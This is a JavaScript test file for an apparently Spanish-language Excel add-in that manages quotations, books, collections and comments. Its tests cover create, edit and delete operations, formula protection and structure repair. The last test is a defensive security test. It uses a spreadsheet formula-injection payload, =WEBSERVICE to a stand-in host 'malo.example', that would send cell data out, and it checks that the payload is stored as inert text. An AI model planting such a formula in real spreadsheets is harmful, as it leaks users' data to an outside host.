import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as X from '../excel/capa.js';
import { CONFIG_DEF, msASerial } from '../core/datos.js';
import { libroSimulado } from '../excel/simulado.js';

const AHORA = new Date(2026, 9, 15, 10, 0).getTime();
const FORM = { text: 'Solo las ideas pueden vencer a las ideas.', author: 'Ludwig von Mises', book: 'Socialismo', understood: 'Se gana en la opinión pública.', topic: 'Ideas', collection: 'Batalla' };
const col = (tb, nombre) => tb.encabezados.indexOf(nombre);

test('libro recién estructurado: todo vacío, config por defecto, sin avisos', async () => {
  const { ctx } = libroSimulado();
  const m = await X.leerTodo(ctx);
  assert.deepEqual([m.citas, m.libros, m.colecciones, m.comentarios, m.avisos], [[], [], [], [], []]);
  assert.deepEqual(m.config, { ...CONFIG_DEF, cuaderno_anio: '' });
  assert.deepEqual((await X.buscarCitas(ctx, { query: 'x' })).citas, []);
});

test('crearCita en tabla vacía: ocupa la fila en blanco, crea libro y colección, un único sync de escritura', async () => {
  const { ctx, tablas, stats } = libroSimulado();
  const { cita, libroNuevo, coleccionNueva } = await X.crearCita(ctx, FORM, AHORA);
  assert.equal(tablas.tblCitas.filas.length, 1);
  const f = tablas.tblCitas.filas[0];
  assert.equal(f[col(tablas.tblCitas, 'id')], 'u' + AHORA);
  assert.equal(f[col(tablas.tblCitas, 'usuario')], 'Tú');
  assert.equal(f[col(tablas.tblCitas, 'creada_fecha')], msASerial(AHORA));
  assert.equal(libroNuevo.estado, 'leyendo');
  assert.deepEqual(tablas.tblLibros.filas[0].slice(0, 4), ['Socialismo', 'Ludwig von Mises', 0, 'leyendo']);
  assert.equal(coleccionNueva.nombre, 'Batalla');
  assert.equal(tablas.tblColecciones.filas[0][0], 'Batalla');
  assert.deepEqual(stats.porSync.filter(n => n > 0), [3]); // cita + libro + colección en el mismo sync, una escritura por tabla
  assert.equal(cita.id, 'u' + AHORA);
});

test('crear → aparece en la búsqueda al instante; segunda cita usa rows.add', async () => {
  const { ctx, tablas } = libroSimulado();
  await X.crearCita(ctx, FORM, AHORA);
  await X.crearCita(ctx, { ...FORM, text: 'Otra', book: 'Socialismo', collection: '' }, AHORA + 1000);
  assert.equal(tablas.tblCitas.filas.length, 2);
  assert.equal(tablas.tblLibros.filas.length, 1); // el libro ya existía
  const r = await X.buscarCitas(ctx, { query: 'VENCER', sort: 'recent' });
  assert.deepEqual(r.citas.map(c => c.text), ['Solo las ideas pueden vencer a las ideas.']);
  assert.equal((await X.filtrarPor(ctx, 'book', 'Socialismo')).citas.length, 2);
});

test('crearCita con datos incompletos: error en español y no escribe nada', async () => {
  const { ctx, tablas, stats } = libroSimulado();
  await assert.rejects(X.crearCita(ctx, { text: 'x' }, AHORA), { name: 'ErrorReadCite', message: 'Completa autor, libro, lo que entendiste' });
  assert.equal(stats.escrituras, 0);
  assert.equal(tablas.tblCitas.filas[0].every(v => v === ''), true);
});

test('editarCita: solo escribe las celdas que cambian; persiste; error con id', async () => {
  const { ctx, tablas } = libroSimulado();
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  const otra = tablas.tblCitas.filas[0][col(tablas.tblCitas, 'libro')];
  await X.editarCita(ctx, cita.id, { why: 'Me recuerda a Hayek', id: 'hack' });
  const m = await X.leerTodo(ctx);
  assert.equal(m.citas[0].why, 'Me recuerda a Hayek');
  assert.equal(m.citas[0].id, cita.id);
  assert.equal(tablas.tblCitas.filas[0][col(tablas.tblCitas, 'libro')], otra);
  await assert.rejects(X.editarCita(ctx, 'u0', { why: 'x' }), { message: 'Cita u0: no existe en tblCitas.' });
  await assert.rejects(X.editarCita(ctx, cita.id, { author: '' }), { message: `Cita ${cita.id}: falta autor` });
});

test('protección de fórmulas: para antes de pisar una fórmula y no toca nada', async () => {
  const { ctx, tablas, stats } = libroSimulado();
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  const j = col(tablas.tblCitas, 'tema');
  tablas.tblCitas.formulas[0][j] = '=UPPER([@concepto])';
  const antes = stats.escrituras;
  await assert.rejects(X.editarCita(ctx, cita.id, { topic: 'Otro' }), err => err.message.includes('la columna «tema» de tblCitas tiene una fórmula') && err.id === cita.id);
  assert.equal(stats.escrituras, antes);
  await X.editarCita(ctx, cita.id, { why: 'ok' }); // otras columnas sí se pueden editar
  assert.equal(tablas.tblCitas.formulas[0][j], '=UPPER([@concepto])');
});

test('columna calculada propia del usuario: se respeta en filas nuevas; si es una columna de ReadCite, para', async () => {
  const { ctx, tablas } = libroSimulado();
  const tc = tablas.tblCitas;
  tc.encabezados.push('mi_extra'); tc.filas[0].push(''); tc.formulas[0].push('=LEN([@texto])');
  await X.crearCita(ctx, FORM, AHORA);
  await X.crearCita(ctx, { ...FORM, text: 'Dos' }, AHORA + 1);
  assert.equal(tc.formulas[1].at(-1), '=LEN([@texto])');
  tc.formulas[0][col(tc, 'likes')] = '=0';
  await assert.rejects(X.crearCita(ctx, { ...FORM, text: 'Tres' }, AHORA + 2), /columna «likes» de tblCitas tiene una fórmula/);
});

test('borrarCita: quita la fila y sus comentarios; la última fila se vacía en vez de borrarse', async () => {
  const { ctx, tablas } = libroSimulado();
  const a = (await X.crearCita(ctx, FORM, AHORA)).cita;
  const b = (await X.crearCita(ctx, { ...FORM, text: 'B' }, AHORA + 1)).cita;
  await X.anadirComentario(ctx, a.id, 'Comentario A', AHORA);
  await X.anadirComentario(ctx, b.id, 'Comentario B', AHORA);
  const r = await X.borrarCita(ctx, a.id);
  assert.equal(r.comentariosBorrados, 1);
  let m = await X.leerTodo(ctx);
  assert.deepEqual(m.citas.map(c => c.id), [b.id]);
  assert.deepEqual(m.comentarios.map(c => c.texto), ['Comentario B']);
  assert.equal((await X.buscarCitas(ctx, { query: 'vencer' })).citas.length, 0);
  await X.borrarCita(ctx, b.id);
  m = await X.leerTodo(ctx);
  assert.deepEqual([m.citas, m.comentarios], [[], []]);
  assert.equal(tablas.tblCitas.filas.length, 1); // la fila en blanco que Excel exige
  await assert.rejects(X.borrarCita(ctx, b.id), { message: `Cita ${b.id}: no existe en tblCitas.` });
});

test('guardar / quitar guardada / me gusta', async () => {
  const { ctx } = libroSimulado();
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  await X.guardarCita(ctx, cita.id, AHORA + 5000);
  assert.equal((await X.filtrarPor(ctx, 'soloGuardadas', true)).citas[0].savedAt, AHORA + 5000);
  await X.quitarGuardada(ctx, cita.id);
  assert.equal((await X.filtrarPor(ctx, 'soloGuardadas', true)).citas.length, 0);
  await X.alternarMeGusta(ctx, cita.id);
  assert.equal((await X.leerTodo(ctx)).citas[0].liked, true);
});

test('hoja ausente: las lecturas no rompen; las escrituras dan un error claro', async () => {
  const { ctx, tablas } = libroSimulado();
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  delete tablas.tblComentarios;
  const m = await X.leerTodo(ctx);
  assert.deepEqual(m.avisos, ['Falta la tabla tblComentarios (hoja «Comentarios»).']);
  assert.equal(m.citas.length, 1);
  await assert.rejects(X.anadirComentario(ctx, cita.id, 'x', AHORA), /No encuentro la tabla tblComentarios \(¿se borró la hoja «Comentarios»\?\)/);
  assert.equal((await X.borrarCita(ctx, cita.id)).comentariosBorrados, 0);
  delete tablas.tblCitas;
  assert.deepEqual((await X.buscarCitas(ctx, {})).citas, []);
  await assert.rejects(X.crearCita(ctx, FORM, AHORA), /No encuentro la tabla tblCitas/);
});

test('repararEstructura: recrea lo que falta y no pisa datos ajenos', async () => {
  const { ctx, tablas, hojas } = libroSimulado();
  delete tablas.tblLibros; hojas.delete('Libros');
  assert.deepEqual(await X.repararEstructura(ctx), ['hoja Libros', 'tabla tblLibros']);
  assert.deepEqual(tablas.tblLibros.encabezados, ['titulo', 'autor', 'paginas', 'estado', 'leidas', 'anio']);
  await X.actualizarLibro(ctx, 'Socialismo', { estado: 'quiero', paginas: 600 });
  assert.equal((await X.leerTodo(ctx)).libros[0].paginas, 600);
  delete tablas.tblColecciones;
  hojas.get('Colecciones').celdas.set('A1', 'mis notas');
  await assert.rejects(X.repararEstructura(ctx), /La hoja «Colecciones» existe y tiene datos/);
  assert.deepEqual(await X.repararEstructura(libroSimulado().ctx), []);
});

test('columnas en otro orden y columnas obligatorias ausentes', async () => {
  const { ctx, tablas } = libroSimulado();
  const tc = tablas.tblCitas;
  const orden = [...tc.encabezados].reverse();
  tc.encabezados = orden; tc.filas = [orden.map(() => '')]; tc.formulas = [orden.map(() => '')];
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  assert.equal((await X.leerTodo(ctx)).citas[0].text, FORM.text);
  assert.equal(tc.filas[0][0], ''); // mask_json ahora es la primera columna
  tc.encabezados[tc.encabezados.indexOf('texto')] = 'cita';
  await assert.rejects(X.editarCita(ctx, cita.id, { why: 'x' }), /A la tabla tblCitas le faltan las columnas: texto/);
});

test('libros, colecciones y configuración', async () => {
  const { ctx } = libroSimulado();
  await X.actualizarLibro(ctx, 'Liberalismo', { estado: 'leidos', paginas: 224, leidas: -3 });
  let m = await X.leerTodo(ctx);
  assert.deepEqual([m.libros[0].estado, m.libros[0].leidas], ['leidos', 0]);
  await assert.rejects(X.actualizarLibro(ctx, 'X', { estado: 'leído' }), /estado no válido/);
  await X.crearColeccion(ctx, { nombre: 'Clásicos', descripcion: 'Viejos' }, AHORA);
  await assert.rejects(X.crearColeccion(ctx, { nombre: 'Clásicos' }, AHORA), { message: 'Ya existe la colección «Clásicos»' });
  await X.guardarConfig(ctx, { paginas_dia: 35, usuario_local: 'Dani', nueva_clave: 'x' });
  m = await X.leerTodo(ctx);
  assert.deepEqual([m.config.paginas_dia, m.config.usuario_local, m.colecciones[0].descripcion], [35, 'Dani', 'Viejos']);
  const { cita } = await X.crearCita(ctx, FORM, AHORA);
  assert.equal(cita.user, 'Dani');
  assert.equal((await X.filtrarPor(ctx, 'mine', true)).citas.length, 1);
});

test('seguridad: una «cita» que empieza por = se guarda como texto, nunca como fórmula', async () => {
  const { ctx, tablas } = libroSimulado();
  const ataque = '=WEBSERVICE("http://malo.example/?d="&A1)';
  const { cita } = await X.crearCita(ctx, { ...FORM, text: ataque, author: '+Autor', book: '@libro', understood: '-nota' }, AHORA);
  const tc = tablas.tblCitas;
  // el valor guardado es el texto literal (Excel quita el apóstrofo) y no un resultado de fórmula («…» en el simulador)
  assert.equal(tc.filas[0][tc.encabezados.indexOf('texto')], ataque);
  const m = await X.leerTodo(ctx);
  assert.deepEqual([m.citas[0].text, m.citas[0].author, m.citas[0].book, m.citas[0].understood], [ataque, '+Autor', '@libro', '-nota']);
  await X.editarCita(ctx, cita.id, { why: '=1+1', text: ataque + ' (editada)' }); // editar una cita protegida no se bloquea
  assert.equal((await X.leerTodo(ctx)).citas[0].why, '=1+1');
  assert.ok(!String(tc.filas[0][tc.encabezados.indexOf('por_que')]).startsWith('«'));
});
